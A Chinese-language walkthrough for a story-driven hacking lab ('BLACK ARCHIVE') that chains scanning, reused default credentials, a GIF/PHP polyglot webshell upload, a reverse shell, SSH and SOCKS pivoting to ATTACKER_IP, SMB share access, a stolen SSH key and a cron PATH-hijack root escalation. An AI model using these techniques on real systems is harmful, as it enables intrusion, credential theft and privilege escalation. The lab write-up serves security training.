# BLACK ARCHIVE — Walkthrough（操作記錄）

## FRONTIER (172.20.1.10 / host:8080,8025)

### 1. 全端口掃描
- 發現：`nmap -sC -sV -p- TARGET` → 只有 8080/tcp http、8025/tcp http 兩個 port，沒有其他東西——relay、archive 都沒有映射任何 host port，這次掃描完全看不到
- 測試：直接瀏覽 `http://TARGET:8080/`
- 成功：ROSTER Terminal 首頁，導覽列有 Home / Search / Upload / Ping / Notes
- 下一步：用委託信裡的三個名字查 Dependent Status Index

### 2. 搜尋三個名字
- 發現：`?page=search&q=` 有真的後端資料，不是裝飾頁
- 測試：`curl "TARGET:8080/?page=search&q=Okafor"`（Wren、Farrow 同法）
- 成功：三筆都回傳真案件卡（case_ref、colony、status），**且都多一個其他案件沒有的欄位：`Internal transfer ref: SPINDLE-7-0119`（Wren/Farrow 類推）**；另外多搜幾個名字會發現 7 筆裡有 4 筆是正常對照組，完全沒有這個欄位
- 下一步：這個欄位自己就是異常，先去翻 Support Tickets 找脈絡，順便查這個功能能不能拿到原始 intake 資料（→ Upload）

### 3. Notes 目錄
- 發現：`/notes/` 有 autoindex，列出比導覽列連結還多的檔案
- 測試：`curl TARGET:8080/notes/`
- 成功：多出 `credential_rotation_status.txt`（不在導覽列連結裡）；`todo.txt` 確認 2. 看到的欄位不是巧覺——這 3 筆是整個索引裡唯一這欄還有值的已結案案件
- 下一步：讀 `credential_rotation_status.txt` 跟 `welcome.txt`

### 4. 帳密外洩（兩份文件合起來才是完整答案）
- 發現：`credential_rotation_status.txt` 是 T. Reyes 的稽核工單，寫著 `sysadmin` 從沒經過 first-login 輪替、還在用 provisioning 範本的預設值，但**沒有直接寫出那組密碼**（devuser/deploy 已標記為輪替/停用，死線索）；`welcome.txt` 另外提到一句通用政策：新帳號的範本預設密碼是 `admin123`
- 測試：把兩份文件的資訊接起來——沒輪替的帳號是 `sysadmin`，範本預設是 `admin123`
- 成功：推出 `sysadmin/admin123`，會被重複使用
- 下一步：試試看 Upload 這個功能頁；順便試這組帳密登 webmail

### 5. Upload（拿 shell，第一個「突破後才有」的故事事實）
- 發現：`?page=upload` 現在會擋非圖片檔（`getimagesize()` 檢查）；頁面文字明講這是案件結案後唯一還能新增/補正文件的管道，這也是玩家會想測這個功能的理由——不是單純「有上傳功能就測」
- 測試：先傳一個純 `.php`（被擋）；再傳 GIF89a 檔頭 + PHP payload 的 polyglot
- 成功：polyglot 上傳成功，`GET /uploads/shell.php?c=id` 回傳 `uid=33(www-data)`
- 下一步：用這個 shell 讀 `/var/backups/roster/reyes_scratch.txt`——不在 `/notes/` 底下、LFI 式的 `?page=notes&file=` 也碰不到，只有真的拿到程式碼執行才讀得到。內容是 T. Reyes 自己把整個索引比對過一輪的私人筆記，確認 2. 看到的欄位確實只出現在這 3 筆案件上——第一個只有突破後才能確認的故事事實；接著去查 webmail

### 6. Webmail 登入 + 收件匣
- 發現：webmail 登入會設一個 session cookie，`/inbox` 沒有有效 cookie 一律 302 回登入頁——沒有 `/debug` 環境變數洩漏可以抄捷徑，也沒有繞過登入直接讀信箱的路，讀信箱唯一的路就是 4. 推出來的那組密碼
- 測試：`curl -c cookie.txt -X POST TARGET:8025/login --data "user=sysadmin&pass=admin123"`，再帶著 cookie GET `/inbox`
- 成功：`sysadmin/admin123` 登入成功；18 封信裡挑出關鍵的幾封：`root/S3cretDB!2024`（LEDGER sandbox）、一串多部門引言串提到 N. Okafor 跟 transfer_ref 異常、一個死線索帳號 `svc-relay`、兩封分別是殖民地行政單位問 Okafor（OCPA-R4-11902）跟 Wren（OCPA-R4-11944）案子被 Records 用幾乎同一套話打發，還提到「不是第一次問了」
- 下一步：【推理節點 0，非必經但建立懷疑】把這兩封信跟 `welcome.txt`/`todo.txt`/"New Case Handler Onboarding"/"you're not going to believe this" 四個獨立來源的「這只是遷移假影」說法放在一起看——同一句話出現在太多互不相關的地方，而且剛好黏著 LONGSHORE 名單裡至少兩個名字、黏了好幾年，這時候還沒有證據，但應該已經不信官方說法了。這組 `sysadmin/admin123` 同時是 OS 帳號，但 RELAY 沒有映射 SSH port，得先在 FRONTIER 自己拿到一個真正互動式的 shell 才能往裡面 pivot（見 7.）

---

## RELAY (dmz:172.20.1.12 / internal:10.10.0.12 / 無 host port)

### 7. Pivot 進 RELAY（不再能從攻擊機直接 SSH）
- 發現：`nmap -p- TARGET` 只看得到 frontier 的兩個 port，relay 沒有映射任何 port 出來——但它跟 frontier 在同一個 dmz 網段（172.20.1.0/24），container 間互通
- 測試：先用 5. 的 webshell 開一個 bash reverse shell 回自己的 nc listener，再用 `python3 -c 'import pty; pty.spawn("/bin/bash")'` 升級成真正的互動式 TTY（否則 ssh 密碼提示打不進去），然後在這個真終端機裡打 `ssh sysadmin@172.20.1.12`，密碼 `admin123`（跟 webmail 同一組）
- 成功：拿到 RELAY 上 sysadmin 的 shell
- 下一步：這台是 dual-homed，掃內部服務（`3000` API、`3306` MariaDB）

### 8. LEDGER API
- 發現：`127.0.0.1:3000` 沒對外開 port，但這是在 relay 自己的 shell 裡打，本機服務直接 `127.0.0.1` 就能連
- 測試：`curl 127.0.0.1:3000/api/cases`（只回摘要：id/name/colony）、`/api/cases/1~5`（完整紀錄）、`/api/health`
- 成功：`/api/cases` 列表本身看不到 `transfer_ref`，要逐一查 id 才看得到；`/api/cases/1~3` 完整紀錄有不該存在的 `transfer_ref`；`/api/cases/5` 是服務帳號 `ledger-cairn-sync`（不是案件，第一次看到 CAIRN 這個名字）；`/api/health` 只回報 `archive_fileshare: "degraded"`，不給實際位址
- 下一步：有個叫 CAIRN 的東西存在、而且目前狀態異常，去找它實際的位址跟帳密

### 9. MariaDB（要調參數才連得上）
- 發現：預設 client 遠端連線會被要求 TLS（`ERROR 2026 ... SSL is required`）；另外不要省略 `-h` 或用 `localhost`——不帶 `-h`（或用 `localhost`）預設會走 local Unix socket，MariaDB 的 `unix_socket` 認證外掛可能讓本機使用者直接免密碼登入，不會真的驗證到這組密碼
- 測試：`mariadb -h 127.0.0.1 -u root -p'S3cretDB!2024' --skip-ssl ledger`（用 `-h 127.0.0.1` 或加 `--protocol=tcp` 強制走 TCP，才是真的驗證到這組密碼，不是撿到 unix socket 的免密碼捷徑）
- 成功：加 `--skip-ssl` 之後連上，`SELECT * FROM service_accounts` 拿到 CAIRN Fileshare 帳密（跟 sysadmin/admin123 一樣）、`dependent_case_index`（10 筆背景資料）、`system_migration_log`（第一次點名 ONI Section III / Cmdr. Petrov）
- 下一步：`service_accounts` 沒有 CAIRN Records Terminal 的帳密，去查檔案系統

### 10. sync.conf
- 發現：`/etc/ledger/` 目錄下除了 `sync.conf` 還有 `audit_note.txt`
- 測試：`cat /etc/ledger/sync.conf`
- 成功：拿到 `administrator / Records!Access99`（CAIRN Records Terminal 帳密）
- 下一步：pivot 進 CAIRN（cairn.internal，只能從這台內部網段抵達）

---

## ARCHIVE (internal:10.10.0.15 / cairn.internal，無 host port)

### 11. Pivot
- 發現：archive 沒有映射任何 port 到宿主機，而且只在 internal network 上——frontier 碰不到它，只有 relay 是 dual-homed；但 relay 本身沒裝 `smbclient`，SMB 這些工具還是要用攻擊機自己的
- 測試：在 7. 拿到的 relay shell 裡開一個反向 dynamic SOCKS 轉發回攻擊機自己的 sshd：`ssh -R 1080 <自己的帳號>@ATTACKER_IP -N`
- 成功：攻擊機本機 `127.0.0.1:1080` 變成一個 SOCKS 代理，背後走 relay 的網路視角，能碰到 archive
- 下一步：接下來攻擊機自己的工具都用 `proxychains4` 包著打（設定檔指向 `socks5 127.0.0.1 1080`），先掃 SMB

### 12. SMB 列分享
- 發現：預設 smbclient（SMB3）連不上
- 測試：`proxychains4 smbclient -L //cairn.internal/ -U sysadmin%admin123 -m NT1`
- 成功：加 `-m NT1` 之後列出 `public / confidential / backups` 三個分享
- 下一步：三個分享都掃一遍

### 13. public（guest 可讀寫）
- 發現：不需要密碼
- 測試：`proxychains4 smbclient //cairn.internal/public -U guest% -m NT1 -c "ls"`
- 成功：拿到 `records_retention_schedule.txt`（解釋 2547 年為什麼一堆舊案被翻出來）、其餘是填充
- 下一步：查 confidential（要密碼）

### 14. confidential
- 發現：`valid users = sysadmin`
- 測試：`proxychains4 smbclient //cairn.internal/confidential -U sysadmin%admin123 -m NT1 -c "ls"`
- 成功：拿到 acquisition directive（SPARTAN-II 名稱正式出現，只講「為什麼帶走、怎麼掩蓋」，不講「後來怎麼了」）、disposition order 掃描件、`cairn_access_log_extract.txt`（Petrov 在 2547-02-11 對 07-B 做過一次 `CUSTODY_STATUS_SET`）、`spartan_designation_crosscheck.txt`（兩筆 case_ref 對現役 Spartan 編號的比對，完全沒有姓名）、**`cairn_backup_key`（真的 SSH 私鑰）**
- 下一步：這台的 SSH 密碼認證被關掉了，用這把 key

### 15. SSH（key-only）
- 發現：`sysadmin/admin123` 對這台 SSH 完全無效（`Permission denied (publickey)`）
- 測試：`chmod 600 cairn_backup_key; proxychains4 ssh -i cairn_backup_key sysadmin@cairn.internal`（走同一條 SOCKS 隧道，不用另開 jump host）
- 成功：拿到 archive 本機 shell
- 下一步：先把 CAIRN Records Terminal 的文件讀完，再做提權

### 16. backups（guest 可讀寫）
- 測試：`proxychains4 smbclient //cairn.internal/backups -U guest% -m NT1 -c "ls"`
- 成功：拿到 `casualty_log_partial.txt`（四筆 augmentation 結果，**只有 case_ref，沒有姓名也沒有 Spartan 編號**）、`training_roster_fragment.txt`（只有代號+殖民地+年齡）、`foia_review_2553.txt`（N. Okafor 2553 年正規申請被駁回，內部備註她的名字跟遷移事務員同名）、`n.okafor_badge_photo.jpg`
- 下一步：訓練代號要自己還原成真名（見推理節點）；`casualty_log_partial.txt` 也要靠自己的對照表還原，見 17.

### 17. 案件結果 + Spartan 編號重建（跨分享比對，不需要新指令，靠自己的筆記）
- 發現：`casualty_log_partial.txt`（16.，backups share，guest 權限）跟 `spartan_designation_crosscheck.txt`（14.，confidential share，要 sysadmin 密碼）**都只用 case_ref，完全不寫姓名**，而且分別放在存取權限不同的兩個分享區，不是同一份文件的兩個部分
- 測試：沒有新指令要打——把手上已經有的三樣東西攤開對表：(a) Act I/II 就記下的 case_ref↔姓名對照（`OCPA-R4-11902=Okafor`、`11944=Wren`、`11887=Farrow`、`10733=Voight`）、(b) 16. 的結果表（`11902` 死亡、`11944` 現役、`11887` 除役有爭議、`10733` 現役）、(c) 14. 的編號表（`11944=Spartan-108`、`10733=Spartan-128`）
- 成功：拼出「Talia Wren 現役、編號 Spartan-108」「Samuel Voight 現役、編號 Spartan-128」——這個結論沒有任何一份文件單獨講過，是三份文件對表出來的
- 下一步：CAIRN Records Terminal 還沒登入，去登入讀六份文件

### 18. CAIRN Records Terminal 登入
- 發現：`/dashboard`、`/records/*` 要 session cookie
- 測試：`proxychains4 curl -c cairn_cookies.txt -X POST cairn.internal:8080/login -d "username=administrator&password=Records!Access99"`（帳密是 10. 在 `sync.conf` 找到的合法帳密，不是 14.；`-c cairn_cookies.txt` 存下這台自己的 session cookie，不要沿用 6. webmail 那份 `cookie.txt`——是兩台不同主機、各自獨立的 session）
- 成功：302 + `Set-Cookie: cairn_session=...`，存進 `cairn_cookies.txt`
- 下一步：帶著這個 cookie 讀 dashboard

### 19. 讀六份 CAIRN 文件
- 測試：`proxychains4 curl -b cairn_cookies.txt cairn.internal:8080/dashboard`，再逐一 `proxychains4 curl -b cairn_cookies.txt .../records/101~106`
- 成功：101 Disposition Order、102 Castel 自白「事後審核簽核了三份」（**沒寫是哪三份**——她是 ONI 端醫療督導，不是到場簽署的人）、103 Halsey 書信、104 Kade 備忘錄（追加「07-B」線索）、105 Medical Cert Log（102 只說三份、沒寫哪三份，這裡列出四筆並分「當地簽署醫師」跟「ONI 檔案審核」兩欄，要自己數才知道第四份的 ONI 端審核是 Achebe 而非 Castel）、106 07-B 低溫轉移授權
- 下一步：四個推理節點——(0) 17. 已經做過的案件結果/編號重建；(1) 102 說三份、沒寫哪三份 vs 105 列出四筆，要自己數出少了哪一筆、誰簽的；(2) 用 16. 的訓練名冊把 07-B 代號還原成 Farrow（Skopje 只有一筆），發現 Kade 說的跟官方紀錄矛盾；(3) 106 給出第三個互相矛盾的版本，遊戲不解答哪個真——都做完之後去提權

### 20. 本機提權
- 發現：`/etc/crontab` 有 `PATH=/opt/staging:...` 排在系統目錄前面；`/opt/healthcheck.sh`（root:release 750，讀得到寫不到）內部呼叫未寫絕對路徑的 `logtool`；`id` 顯示 sysadmin 是 `release` 群組成員；`/opt/staging` 對這個群組可寫
- 測試：在 `/opt/staging` 放一個叫 `logtool` 的腳本（`cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash`），等 root cron 一分鐘內執行
- 成功：`/tmp/rootbash -p` → `euid=0(root)`
- 下一步：讀最終文件

### 21. 最終文件
- 測試：`cat /root/cairn_disposition_review.txt`
- 成功：讀到 Petrov 的私人記述——SPINDLE 除役檢查把 07-B 列入審查清單，他在審查觸發前私自把保管狀態改成「繼續、無需處理」，跳過審查，未經授權；07-B 的三份矛盾來源依然沒有標準答案
- 下一步：（無，案件結束——但完整真相見 `truth-zh.md` / `truth-en.md`）
